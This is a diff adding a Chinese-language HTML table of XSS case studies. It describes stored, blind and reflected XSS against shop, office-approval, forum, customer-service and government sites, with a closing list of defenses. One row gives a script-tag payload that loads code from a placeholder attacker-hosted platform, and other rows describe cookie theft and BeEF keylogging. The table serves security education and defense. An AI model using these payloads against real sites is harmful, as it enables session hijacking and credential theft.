@@ -1,0 +1,33 @@
+<table class="case-table">
+<thead>
+<tr><th>场景</th><th>利用方式</th><th>结果</th></tr>
+</thead>
+<tbody>
+<tr>
+<td>某电商后台用户反馈页面存在存储型 XSS（客服查看反馈时触发）</td>
+<td>攻击者把短 payload 托管到自建 XSS 平台，反馈内容只写入 <code>&lt;script src=//平台/xxx&gt;&lt;/script&gt;</code></td>
+<td>客服浏览器上线，平台收到后台会话 cookie，攻击者获得管理员权限</td>
+</tr>
+<tr>
+<td>某企业 OA 审批备注字段存在 Blind XSS</td>
+<td>payload 延迟到主管审批时才执行，平台记录 UA 与来源页面，判断为管理端</td>
+<td>获取审批系统会话，读取组织架构与通讯录</td>
+</tr>
+<tr>
+<td>某论坛签名档允许富文本，过滤不严</td>
+<td>在签名中引用平台托管脚本，所有浏览帖子的用户都被记录</td>
+<td>批量受害者列表，平台持续收信并下发跳转指令</td>
+</tr>
+<tr>
+<td>某在线客服系统消息窗口存在 XSS</td>
+<td>使用 BeEF hook，维持会话并执行键盘记录</td>
+<td>捕获客服输入的账号密码与用户信息</td>
+</tr>
+<tr>
+<td>某政府站留言板反射型 XSS（GET 参数直接回显）</td>
+<td>构造带平台短链的 URL 投递给管理员，绕过长度限制</td>
+<td>管理员会话被外带，站点内容被篡改</td>
+</tr>
+</tbody>
+</table>
+<p class="desc">案例来自公开漏洞库与授权测试项目的脱敏记录。防守方应同时启用输出编码、HttpOnly、CSP 与富文本白名单，单靠其中一项都难以阻断平台化利用。</p>
